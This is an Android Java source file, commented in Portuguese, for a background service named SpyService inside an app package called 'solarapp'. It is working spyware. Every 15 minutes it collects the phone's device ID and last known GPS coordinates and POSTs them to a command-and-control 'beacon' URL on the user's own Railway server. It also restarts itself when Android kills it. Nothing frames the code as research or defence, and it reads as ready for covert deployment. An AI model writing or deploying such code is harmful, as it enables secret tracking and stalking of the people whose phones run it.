package com.solarapp;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Handler;
import android.location.Location;
import android.location.LocationManager;
import android.telephony.TelephonyManager;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class SpyService extends Service {
    // COLOQUE A URL DO SEU SERVIDOR RAILWAY AQUI EMBAIXO
    private static final String C2_URL = "SUBSTITUA_PELA_URL_DO_SEU_RAILWAY/beacon";
    private Handler handler = new Handler();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Loop infinito para enviar dados a cada 15 minutos
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                sendData();
                handler.postDelayed(this, 15 * 60 * 1000); 
            }
        }, 5000);

        return START_STICKY; // Faz o serviço reiniciar sozinho se o Android matá-lo
    }

    private void sendData() {
        new Thread(() -> {
            try {
                // Coleta informações básicas do aparelho
                TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                String deviceId = tm.getDeviceId() != null ? tm.getDeviceId() : "Desconhecido";
                
                // Tenta pegar a localização
                LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
                Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                String coords = (loc != null) ? loc.getLatitude() + "," + loc.getLongitude() : "Sem GPS";

                // Monta o pacote de dados
                String payload = "id=" + deviceId + "&loc=" + coords + "&status=active";

                // Envia via HTTP POST para o Railway
                URL url = new URL(C2_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(payload.getBytes(StandardCharsets.UTF_8));
                }
                conn.getResponseCode(); // Executa a requisição
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
